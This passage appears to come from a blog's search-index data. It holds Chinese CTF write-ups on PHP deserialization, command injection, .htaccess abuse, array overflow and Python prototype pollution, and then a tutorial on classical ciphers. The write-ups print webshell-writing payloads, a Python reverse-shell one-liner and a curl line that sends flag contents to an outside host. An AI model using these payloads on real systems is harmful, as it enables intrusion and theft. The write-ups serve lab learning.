(preg_match($filter2, $url)) &#123;        die(&quot;??&quot;);    &#125;         $text = @file_get_contents($url, false);    print($text);    if(isset($c))&#123;        echo $x = unserialize($c);    &#125;    else&#123;        echo &quot;your hat is too black!&quot;;    &#125;?&gt;\n\n\n\n\n\n\n\n我服了，一开始还以为靶场出问题了，结果在百度界面下面加载出来了，看来要仔细观察这个下滑框啊妈的\n拿到源码后直接代码审计\n//ser.php&lt;?phperror_reporting(0);if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123;//检查我们请求的ip是否为127.0.0.1,这也就是为什么一开始没有显示代码    highlight_file(__FILE__);&#125;$flag=&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;;class GWHT&#123;    public $hero;    public function __construct()&#123;        $this-&gt;hero = new Yasuo;    &#125;    public function __toString()&#123;        if (isset($this-&gt;hero))&#123;            return $this-&gt;hero-&gt;hasaki();        &#125;else&#123;            return &quot;You don&#x27;t look very happy&quot;;        &#125;    &#125;&#125;class Yongen&#123; //flag.php    public $file;    public $text;    public function __construct($file=&#x27;&#x27;,$text=&#x27;&#x27;) &#123;        $this -&gt; file = $file;        $this -&gt; text = $text;    &#125;    public function hasaki()&#123;//写入文件寒素，虽然添加了死亡dia，但是可以通过文件名结合php伪协议让木马进行base64编码进行绕过        $d   = &#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;;        $a= $d. $this-&gt;text;        @file_put_contents($this-&gt; file,$a);    &#125;&#125;class Yasuo&#123;    public function hasaki()&#123;        return &quot;I&#x27;m the best happy windy man&quot;;    &#125;&#125;?&gt;\n\n这是wp的pop链，但我真的不知道是怎么触发__tostring的，应该是star1.php中那个echo触发的\n&lt;?phpclass GWHT&#123;    public $hero;&#125;class Yongen&#123;    public $file=&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;    public $text=&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&quot;;    //&lt;?php @eval($_POST[1]);&#125;$a = new GWHT();$a -&gt;hero = new Yongen();echo urlencode(serialize($a));\n\n我们直接传入shell.php中用蚁剑连接即可\n"},{"title":"[羊城杯_2020]Blackcat","url":"/2025/05/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat/","content":"[羊城杯_2020]Blackcat题目给了我们一个mp3文件，然后提示我们要听歌。但是点击后音乐也不会播放，于是在源代码中找到mp3文件，点开后在最后面找到源码\n&lt;?phpif(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123;    die(&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;);&#125;$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#x27;White-cat-monitor&#x27;]))    $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123;    die(&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;);&#125;echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]);\n\n\n\n这个源码首先通过getenv(clandestine)将环境变量进行实体化、\n然后就是使用hash_hmac()进行一个加密，我们需要先了解一下hash_hmac()这个函数\nhash_hmac()\nhash_hmac() 是 PHP 中用于生成带密钥的哈希值（HMAC）的函数，它结合了加密哈希函数和密钥，提供更安全的消息认证机制\nhash_hmac(    string $algo,    string $data,    string $key,    bool $binary = false): string\n\n\n$algo - 要使用的哈希算法名称（如 “sha256”, “md5”）\n可用算法可通过 hash_hmac_algos() 获取\n\n\n$data - 要进行哈希处理的消息&#x2F;数据\n$key - 用于生成HMAC的共享密钥\n$binary (可选) -\nfalse (默认): 返回小写十六进制字符串\ntrue: 返回原始二进制数据\n\n\n\n也就是我们传入的参数作为data，而后面那个变量作为key，对其进行一个加密。我们必须知道最后的加密结果才能绕过。但是哈希加密是不可逆的，我们必须要知道最后一次加密的参数我们才能推出结果，但实际上就是什么都没给我们，于是可以判断这条路走不通。\n我们尝试像md5，sha1等函数传入数组试下，发现当data为数组时加密结果为null，虽然后面还有一次加密，但是我们key和data都可控，我们自然可以控制加密结果\n我们通过扫目录可以发现存在flag.php\n我们先通过One-ear进行命令拼接;cat flag.php，然后再去拿到加密结果\n\n\n然后直接构造payload\nBlack-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat flag.php&amp;White-cat-monitor[]=1\n\n\n\n\n\n但是很奇葩的就是这个是假flag，提交上去是错的，看了其他题解才知道flag.php中没有flag，我们得使用env读取环境变量才能拿到真flag\npayload\nBlack-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;One-ear=;env&amp;White-cat-monitor[]=1\n\n"},{"title":"[羊城杯_2020]Easyphp2","url":"/2025/05/19/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/","content":"[羊城杯_2020]Easyphp2还真的是喜欢出2.0版本的题目，看到这个题目我才发现我1.0版本的题解也没写完。看来下次写完题目就写题解比较好\n首先进入题目就是一个提示\nSorry, only people from GWHT are allowed to access this website.23333\n\n我们需要作为一个人类从来自GWHT，我一开始以为我需要把UA改成people，把Referer改为GWHT。但是想多了，话说我为什么要证明自己是人，我们抓包发现cookie传递参数pass&#x3D;PASS，我尝试将PASS改为GWHT，成功跳转\n跳转之后是一个输入框，会统计你输入的字符数目并输出，并没有获得什么有用的信息\n看了wp之后才知道，url中并没有直接访问GWHT.php，而是\nhttp://fb1a0dee-e561-4f0c-ba12-95bdb4673844.node5.buuoj.cn:81/?file=GWHT.php\n\n这可以直接想到文件包含，尝试读取源码，发现被过滤掉了\n怀疑是base64被过滤掉了，尝试进行绕过\nPHP 的 php://filter 协议在设计上对编码处理较灵活：\n\n自动 URL 解码： PHP 在处理流过滤器时会对路径部分进行 URL 解码（包括多层解码）。\n动态解析过滤器名称： convert.XXX-encode 中的 XXX 可以是任意支持的编码名（如 base64、rot13），且名称可以动态构造。\n\n我们不仅可以使用编码绕过，还可以大小写绕过\n我们对base64进行两次url编码，第一次是解码是由web服务器自动处理，所以传递到代码中的base64只被编码的一次，第二次解码则是当解析php伪协议的时候解码\nhttp://fb1a0dee-e561-4f0c-ba12-95bdb4673844.node5.buuoj.cn:81/?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=GWHT.php\n\n我们成功读取到GWHT.php\n&lt;?phpini_set(&#x27;max_execution_time&#x27;, 5);if ($_COOKIE[&#x27;pass&#x27;] !== getenv(&#x27;PASS&#x27;)) &#123;    setcookie(&#x27;pass&#x27;, &#x27;PASS&#x27;);    die(&#x27;&lt;h2&gt;&#x27;.&#x27;&lt;hacker&gt;&#x27;.&#x27;&lt;h2&gt;&#x27;.&#x27;&lt;br&gt;&#x27;.&#x27;&lt;h1&gt;&#x27;.&#x27;404&#x27;.&#x27;&lt;h1&gt;&#x27;.&#x27;&lt;br&gt;&#x27;.&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;.&#x27;23333&#x27;);&#125;?&gt;&lt;?phpif (isset($_GET[&quot;count&quot;])) &#123;    $count = $_GET[&quot;count&quot;];    if(preg_match(&#x27;/;|base64|rot13|base32|base16|&lt;\\?php|#/i&#x27;, $count))&#123;        die(&#x27;hacker!&#x27;);    &#125;    echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $count . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;;&#125;?&gt;\n\n从这里面其实我感觉可以直接做了，但是robots.txt提到了check.php，尝试读取一下\n&lt;?php$pass = &quot;GWHT&quot;;// Cookie password.echo &quot;Here is nothing, isn&#x27;t it ?&quot;;header(&#x27;Location: /&#x27;);\n\n看了根本没什么用\n我们注意到GWHT.php中有这样一行代码\necho &quot;&lt;h2&gt;The Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $count . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;;\n\n看到了代码执行函数，本来平时是直接cat /flag的，但是这个题目有点特殊，需要用蚁剑连接，于是就用命令执行去写个一句话木马\n我们先对语句进行闭合，然后使用命令分隔符进行命令执行即可，我们一般是使用 | 和 ;进行命令分隔，但是这题好像过滤了;\n&#x27;|echo &quot;&lt;?= eval(\\$_POST[&#x27;cmd&#x27;])?&gt;&quot; |tee a.php|&#x27;#经过拼接就成了，由于在命令执行中$属于特殊字符所以需要进行转义printf &#x27;&#x27;|echo &quot;&lt;?= eval(\\$_POST[&#x27;cmd&#x27;])?&gt;&quot; |tee shell.php | &#x27;&#x27; | wc -c#这里面 wc -c是用于统计输入字符数目\n\n成功上传了\n用蚁剑连接，然后在一个隐秘的路径下找到了flag.txt，但是点击发现什么都没有，大概率是无权限\n其实我们也可以通过find命令寻找flag\nfind / -name flag*\n\n\n\n\n\n但是在GWHT文件中我们又发现了一个README文件\n\n\n关于hash加密，属于单向加密，无法直接解密，只能通过爆破出原文，我没有找到这是什么加密，看了wp发现就是GWHTCTF进行加密的结果\n于是我们，直接将其作为管理员密码进行命令执行即可\nprintf &quot;GWHTCTF&quot; | su - GWHT -c &#x27;cat /GWHT/system/of/a/down/flag.txt&#x27;\n\nsu - GWHT -c &#39;command&#39;\n\n作用：切换用户为 GWHT 并执行指定的命令。\nsu - GWHT：以登录方式切换到用户 GWHT（会加载 GWHT 的环境变量）。\n-c &#39;command&#39;：以 GWHT 的身份执行单条命令（这里是 cat /GWHT/system/of/a/down/flag.txt）。\n\n\n\n原来GWHT文件夹是用户文件夹，白学linux了\n这里不用echo的原因是echo会在输出结尾添加回车符\n\n"},{"title":"[羊城杯2020]easyphp","url":"/2025/04/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/","content":"[羊城杯2020]easyphp &lt;?php    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files = scandir(&#x27;./&#x27;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; \n\n我们先进行代码审计，\n首先是对当前目录的一个文件进行删除，只保留index.php，然后就是对我们传入参数进行过滤\nif(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;$filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;\n\n我们的content不能出现关键词，文件名还不能出现除小写字母和点号(^单独出现在正则表达式中表示不能出现)\n经过这两层过滤后又是一个对非index.php文件的删除，然后就是将我们的文件名和内容写入文件\n起初我以为可以上传到index.php文件中逃过删除，但是不知道为什么对index.php进行覆盖后无法解析我们写入的代码，估计是在其他地方设置了\n关于那个文件删除的代码，一开始也是犹豫了一下，但是发现我们只需要在进行绕过后不再访问index.php即可保留我们上传的文件\n看了wp后发现这是一个十分巧妙的写法\n方法一\n我们可以通过.htaccess文件可以指定文件进行php解析和.htacces文件和php注释不同的特性(.htaccess为#，php为&#x2F;&#x2F;)\npayload\nphp_value auto_prepend_fil\\%0ae .htaccess%0a%23&lt;?php system(&#x27;cat /flag&#x27;);?&gt;\\php_value auto_prepend_fi\\%0ale .htaccess%0a%23&lt;?php system(&quot;cat /fl\\ag&quot;)?&gt;\\\n\n这样，当我们进行拼接后\nphp_value auto_prepend_fil\\e .htaccess #&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\\\\nHello, world\n\n原来添加的\\nHellow,world会导致.htaccess文件解析失败，但是当我们在最后使用\\对换行符进行转移的时候就会让注释符注释掉\n由于还对flag进行了过滤，我们使用通配符\n?content=php_value auto_prepend_fi\\%0ale .htaccess%0a%23&lt;?php system(&quot;cat /fl?g&quot;);?&gt;\\&amp;filename=.htaccess\n\n经过事实证明\\%0a这个将file绕过是必须这样写，给出的原因应该是\\%0a被解析为续航符，导致即使换行了也可以解析\n"},{"title":"[蓝帽杯_2021]One_Pointer_PHP","url":"/2025/06/21/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/","content":"[蓝帽杯_2021]One_Pointer_PHP这个题目直接给源码了，我们来看\nuser.php\n&lt;?phpclass User&#123;\tpublic $count;&#125;?&gt;\n\nadd_api.php\n&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123;\t$count[++$user-&gt;count]=1;\tif($count[]=1)&#123; //判断是一个赋值语句，正常情况下不可能返回false\t\t$user-&gt;count+=1;\t\tsetcookie(&quot;data&quot;,serialize($user));\t&#125;else&#123;\t\teval($_GET[&quot;backdoor&quot;]);\t&#125;&#125;else&#123;\t$user=new User;\t$user-&gt;count=1;\tsetcookie(&quot;data&quot;,serialize($user));&#125;?&gt;\n\n我们可以直接的看到api.php中有一个eval函数，但是我们需要使得一个数组赋值语句返回false才能触发。\n这里用到了php数组溢出的知识点，意思就是当对一个数组中的溢出下标进行赋值的时候会因为数组溢出而赋值失败返回false\n64位系统中php数组最大值为2的63次方减一，即9223372036854775807\n&lt;?php$arr = array();$index = 9223372036854775807;$arr[$index]=1;if($arr[]=1)&#123;//向arr数组最后一位的后一位进行赋值，触发数组溢出\tdie(&#x27;No!&#x27;);&#125;else&#123;\techo &#x27;Yes!&#x27;;&#125;\t?&gt;\n\n\n\n\n\n我们再回到题目中来\nif($user=unserialize($_COOKIE[&quot;data&quot;]))&#123;\t$count[++$user-&gt;count]=1;\tif($count[]=1)&#123; //判断是一个赋值语句，正常情况下不可能返回false\t\t$user-&gt;count+=1;\t\tsetcookie(&quot;data&quot;,serialize($user));\t&#125;else&#123;\t\teval($_GET[&quot;backdoor&quot;]);\t&#125;&#125;else&#123;\t$user=new User;\t$user-&gt;count=1;\tsetcookie(&quot;data&quot;,serialize($user));&#125;\n\n会首先对我们的count值进行下标赋值然后加一，所以我们只要在上限值再减一即可\n&lt;?phpclass User&#123;\tpublic $count=9223372036854775806;&#125;$a=new User();echo urlencode(serialize($a));?&gt;//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D\n\n\n\n于是我们传入\n/add_ap.php?backdoor=phpinfo();cookie : data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D\n\n可以进行代码执行了，但是我们一看phpinfo();\n\n\n不仅命令执行函数被禁了，还被限制了只允许访问网站根目录，看来蚁剑也不能用了\n\n\n\n\n然后我们首先要进行Open_basedir进行绕过，大家都在看大佬的文章\n这里受限于open_basedir的限制只能读取Web服务根目录下的文件，我们需要绕过open_basedir，具体绕过方法我们有以下几种方法：\n\n命令执行函数绕过（system等命令执行函数）\n软链接：symlink()函数\nglob伪协议（搭配PHP原生类DirectoryIterator使用）\n利用ini_set读取文件内容\n\n"},{"title":"陕西省省赛_PPP","url":"/2025/10/03/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-PPP/","content":"陕西省省赛_PPP最近学了Python原型链污染，又正好准备打省赛了，来试一下\n下载下来源码\nfrom flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def evilFunc(arg_1 , * , shell = False):    if not shell:  #也就是说我们必须通过原型链污染污染shell        print(arg_1)    else:                print(__import__(&quot;os&quot;).popen(arg_1).read())    class Family:    def __init__(self):        pass  family = Family()@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index():    if request.data:        merge(json.loads(request.data), family)        evilFunc(&quot;whoami&quot;)    return &quot;fun&quot;@app.route(&#x27;/eval&#x27;,methods=[&#x27;GET&#x27;])def eval():    if request.args.get(&#x27;cmd&#x27;):        cmd = request.args.get(&#x27;cmd&#x27;)        evilFunc(cmd)    return &quot;ok&quot;app.run(host=&quot;0.0.0.0&quot;,port= 3000,debug=False)\n\n于是思路有了，我们需要污染evilFunc的默认参数，Python原型链污染中就__defaults__和__kwdefaults__，我们来看参数\ndef evilFunc(arg_1 , * , shell = False):\n\n使用了*分隔符，很明显shell为关键字参数，我们使用__kwdefaults__\n然后原型链污染的代码还是一样，我反正没见过其他原型链污染的代码，也不知道那个代码有什么用\n直接开始构造payload\n&#123;&quot;__class__&quot;:&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;evilFunc&quot;:&#123;&quot;__kwdefaults__&quot;:&#123;&quot;shell&quot;:true&#125;&#125;&#125;&#125;&#125;&#125;\n\n然后直接发包，注意需要使用GET请求，不知道为什么代码中应该是都可以的，但是我GET才成功了\n\n\n然后就是命令执行反弹shell\nexport%20RHOST=%22IP%22;export%20RPORT=YOUPORT;python%20-c%20&#x27;import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));%5Bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5D;pty.spawn(%22sh%22)&#x27;\n\n拿到flag\n\n\n\n\n也可以使用curl外带，但是不知道为什么flag的框不见了\ncurl http://ip:port/`cat /flag`\n\n\n\n\n","tags":["Python原型链污染"]},{"title":"Crypto_古典密码","url":"/2026/01/29/Crypto-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/","content":"Crypto 古典密码虽然我不是密码手，但是蓝桥杯是单人赛啊╮(╯_╰)╭ ，为了让我的300大洋不打水漂，只能尝试一下密码了。\n密码在做杂项的时候接触过一些，但是古典密码感觉只有在新生赛的时候遇到过。看古典密码不求做题，只是学习一下。\n1.概念古典密码是密码学中的其中一个类型，其大部分加密方式都是利用【替换式密码】或【移项式密码】，有时则是两者的混合。\n其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。\n一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。\n【经典密码】通常很容易被破解。许多经典密码可单单经由密文而破解，所以它们容易受到唯密文攻击法攻击（cipher text only attack）。有些 经典密码（像是【凯撒密码】）的密钥个数有限，所以这类密码可以使用暴力破解尝试所有的密钥。【替代式密码】有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。【多字母替代式密码】，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。\n\n\n\n\n\n2.起源与分类1.起源  密码(Cryptology)是一种用来混淆的技术,它希望将正常的、可识别的信息转变为无法识别的信息。  密码学是一个即古老又新兴的学科,密码学一词源自希腊文“krypto’s”及“logos”两字,直译即为“隐藏”及“讯息”之意。\n密码学是一门拥有几千年历史的学科。\n密码学的发展大概经历了三个阶段: 古典密码阶段、近代密码阶段、现代密码阶段。古典密码阶段是指从密码的产生到发展成为近代密码之间的这段时期密码的发展历史。\n\n【古典密码】是密码学中的其中一个类型，其大部分加密方式都是利用 替换式密码 或 移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。\n古典密码通常来说要对算法和密钥保密，因为很多古典密码一旦算法泄露，就不存在秘密而言了。\n2.分类古典密码大致上可以分为【替换式密码】和【移项式密码】\n【替换式密码】：\n【代换密码】 是通过字母（或是字母群）作原系统的替换，直到消息被替换成其它难以解读的字符串【替换式密码】 分为单字母替换和多字母替换，单字母替换又可继续划分为单表替换密码和夺标替换密码。\n\n\n\n【凯撒密码】是典型的单字母替换式密码，它使用一个密码字母集。\n但我们也可以使用多字母替换式密码，使用多个密码字母集。加密由两组或多组密码字母集组成，加密者可自由的选择然后用交替的密码字母集加密消息。\n这么做将会增加解码的困难度，因为密码破解者必须找出这两组或多组密码字母集。\n另一个著名的多字母替换式密码，称作【维吉尼亚密码】，亦作维吉尼亚方格。这个密码更难解密，通过维吉尼亚方格，它有26组不同用来加密的密码字母集。每个密码字母集就是多移了一位的凯撒密码。\n【移项式密码】\n它们字母本身不变，但它们在消息中顺序是依照一个定义明确的加密算法改变。\n许多移位式密码是基于几何设计的。一个简单的加密（也易被破解），可以将字母向右移1位。例如，明文”Hello my name isAlice.“将变成”olleH ym eman siecilA.”。\n  一个典型的移位式密码被称为栅栏密码，先选择一个关键字，把原来的消息由左而右、由上而下依照关键字长度转写成长方形。  接着把关键字的字母依照字母集顺序编号，例如A就是1、B就是2、C就是3等。依照编号大小调换位置，得到密文。\n\n\n\n\n3.Kerckhoffs原则密码学上的【柯克霍夫原则】（Kerckhoffs’sprinciple）由奥古斯特·柯克霍夫在19世纪提出：即使密码系统的任何细节已为人悉知，只要密钥（key）未泄漏，它也应是安全的。\n 【Kerckhoffs准则】认为，一个密码系统的安全性不是取决于其算法对于攻击者来说是否保密， 而是建立在它所选择的密钥对于攻击者来说是否保密。\n3.典型替换式密码的加解密原理1. 凯撒密码  在密码学中，凯撒密码（英语：Caesar cipher），或称凯撒加密、凯撒变换、变换加密，是一种最简单且最广为人知的加密技术。\n它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。\n例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。\n这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。\n\n\n凯撒密码的替换方法\n通过排列明文和密文字母表，密文字母表示通过将明文字母表向左或向右移动一个固定数目的位置。例如，当偏移量是左移3的时候（解密时的密钥就是3）：\n明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：明文：HEETIAN LAB密文：KHHWLDQ ODE凯撒密码的加密、解密方法还能够通过同余的数学方法进行计算。\n\n来看一下凯撒密码的算法实现\ndef caesar_encrypt(plaintext: str, k: int) -&gt; str:    &quot;&quot;&quot;凯撒加密&quot;&quot;&quot;    ciphertext = &quot;&quot;    for char in plaintext:        if char.isupper():#大小写字母需要分开处理 小写字母处理方式和大写一样            # 将A-Z映射到0-25，移位，再转回字母            shifted = (ord(char) - ord(&#x27;A&#x27;) + k) % 26            ciphertext += chr(shifted + ord(&#x27;A&#x27;))        else:            ciphertext += char  # 非大写字母原样保留    return ciphertextdef caesar_decrypt(ciphertext: str, k: int) -&gt; str:    &quot;&quot;&quot;凯撒解密（使用加密函数，偏移量取负）&quot;&quot;&quot;    return caesar_encrypt(ciphertext, -k)  # 或使用 (26 - k) % 26# 示例plaintext = &quot;HELLO&quot;key = 3encrypted = caesar_encrypt(plaintext, key)  # &quot;KHOOR&quot;decrypted = caesar_decrypt(encrypted, key)  # &quot;HELLO&quot;\n\n加密公式$$y&#x3D;(x+k)mod26;然后转化为字母;C&#x3D;chr(y+ord(A))$$解密公式$$x&#x3D;(y−k)mod26$$\n2.维吉尼亚密码在凯撒密码中，字母表中的每一字母都会作一定的偏移。例如当偏移量为3时，A就转换为了D、B转换为了E……因为凯撒密码中所有字母的偏移量是一样的，因此容易受到字母频率攻击分析，攻击者可以根据密文中出现字母的频率来猜测是由明文中那个字母经过偏移得到的下图为英语语言材料中的字母频率：\n\n\n而【维吉尼亚密码】则是由一些偏移量不同的恺撒密码组成。\n为了生成密码，需要使用表格法。\n这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。\n下图是用来加解密的维吉尼亚表格：\n\n\n这个表的使用方法就是需要将密匙重复延长到和原文相同，然后和原文字母一一对应，每次拿一个原文字母和密匙字母放到表中去寻找对应的密文字母。\n实际上就是将密匙字母作为对应原文字母的凯撒密码的偏移量。由于每个字符的偏移量由密钥决定，所以没有密钥很难破解\n明文：  A T T A C K A T D A W N密钥：  L E M O N L E M O N L E  (重复&quot;LEMON&quot;)数字值：明文：  0 19 19 0  2 10 0 19 3 0 22 13密钥：  11 4 12 14 13 11 4 12 14 13 11 4加密：  11 23 5 14 15 21 4 5 17 13 7 17密文：  L X F O P V E F R N H R\n\nPython算法实现\ndef vigenere_encrypt(plaintext, key):    &quot;&quot;&quot;维吉尼亚加密&quot;&quot;&quot;    result = &quot;&quot;    key = key.upper()    key_len = len(key)        for i, char in enumerate(plaintext.upper()):        if char.isalpha():            # 计算偏移            p = ord(char) - ord(&#x27;A&#x27;)            k = ord(key[i % key_len]) - ord(&#x27;A&#x27;)            c = (p + k) % 26            result += chr(c + ord(&#x27;A&#x27;))        else:            result += char    return resultdef vigenere_decrypt(ciphertext, key):    &quot;&quot;&quot;维吉尼亚解密&quot;&quot;&quot;    result = &quot;&quot;    key = key.upper()    key_len = len(key)        for i, char in enumerate(ciphertext.upper()):        if char.isalpha():            c = ord(char) - ord(&#x27;A&#x27;)            k = ord(key[i % key_len]) - ord(&#x27;A&#x27;)            p = (c - k) % 26            result += chr(p + ord(&#x27;A&#x27;))        else:            result += char    return result# 测试plaintext = &quot;ATTACKATDAWN&quot;key = &quot;LEMON&quot;ciphertext = vigenere_encrypt(plaintext, key)  # LXFOPVEFRNHRdecrypted = vigenere_decrypt(ciphertext, key)  # ATTACKATDAWN\n\n\n\n加密算法$$Ci&#x3D;(Pi +Ki)mod26$$解密算法$$Pi&#x3D;(Ci−Ki)mod26$$\n然后还有一些方法在没有密钥的请况下去进行维吉尼亚解密，但实际上无非就是在爆破。不同的爆破方式罢了，出题人应该没有这么无聊吧\n3.培根密码之所以叫培根密码，其实是发明人叫培根\n这个密码有点简单，实际上就是使用二进制去表示26个字母，二进制使用的不是0和1，而是a和b。\n培根设计的原始编码表（24个字母，I&#x2F;J、U&#x2F;V共用）：\nA = aaaaa    G = aabba    N = abbaa    T = baabaB = aaaab    H = aabbb    O = abbab    U/V = baabbC = aaaba    I/J = abaaa   P = abbba    W = babaaD = aaabb    K = abaab    Q = abbbb    X = bababE = aabaa    L = ababa    R = baaaa    Y = babbaF = aabab    M = ababb    S = baaab    Z = babbb\n\n\n\n现代更常用的版本（区分所有字母）：\nA = AAAAA    N = ABBAAB = AAAAB    O = ABBABC = AAABA    P = ABBBAD = AAABB    Q = ABBBBE = AABAA    R = BAAAAF = AABAB    S = BAAABG = AABBA    T = BAABAH = AABBB    U = BAABBI = ABAAA    V = BABABJ = ABAAB    W = BABBAK = ABABA    X = BABBBL = ABABB    Y = BBAAAM = ABBAB    Z = BBAAB\n\n\n\n如果是原始密码的话一下就可以看出来，培根密码还会有一些变种\n写题目的宗旨就是只要密文可以被分为两种字符都可以尝试培根密码\n方法1：大小写区分（最常用）\n\nA → 小写字母\nB → 大写字母（或反之）\n\n示例\n明文：HELLO编码：AABBB AABAA ABABB ABABB ABBAB选择一段载体文本（需≥25字母）：&quot;this is a normal sentence for bacon cipher&quot;应用规则（A=小写，B=大写）：&quot;thIS Is a NoRmAl SenTeNce fOr bacOn cipher&quot;        AABBB AABAA ABABB ABABB ABBAB解码：H E L L O\n\n\n\n方法2：字体类型区分\n\nA → 普通字体\nB → 斜体 &#x2F; 粗体 &#x2F; 不同字体\n\n方法3：字符类型区分\n\nA → 字母字符\nB → 数字 &#x2F; 标点 &#x2F; 空格\n\n方法4：完全隐写版本\n培根最初设计用两种不同字体（外观相似但略有区别）印刷文本，只有知情者能分辨。\n4.典型移项式密码的加解密原理1.栅栏密码这个密码还是直接看加密过程理解的快一点\n当栏数为2\n明文：HELLO WORLD之字形排列（2行）：H L O W R D  ← 第1行 E L   O L   ← 第2行按行读取：第1行：HLOWRD第2行：ELLOL密文：HLOWRDELLOL#这个是会对空格也进行加密，但实际上现在都不会对空格进行加密，真正加密应该为第 0 行（栏1）：H L O O L第 1 行（栏2）：E L W R D密文：HLOOLELWRD\n\n我们可以看到栅栏解密就是将密文按照栏数决定行数，然后将字符串按照W型去排列，如果翻转过来就是M型了，实际上对应的原文都是一样的。\n然后三栏加密的话就是W变为三行了\n行0：H   O   L行1： E L W R D行2：  L   O密文：HOLELWRDLO\n\n\n\n虽然加密过程很简单，但是解密就有问题了。不同的栏数格式不一样，会得到不同但是结果。实际上就是通过密文长度和栏数推断出格式，然后按照格式去填入对应的字符就行了。\n栅栏密码加解密Python实现\ndef 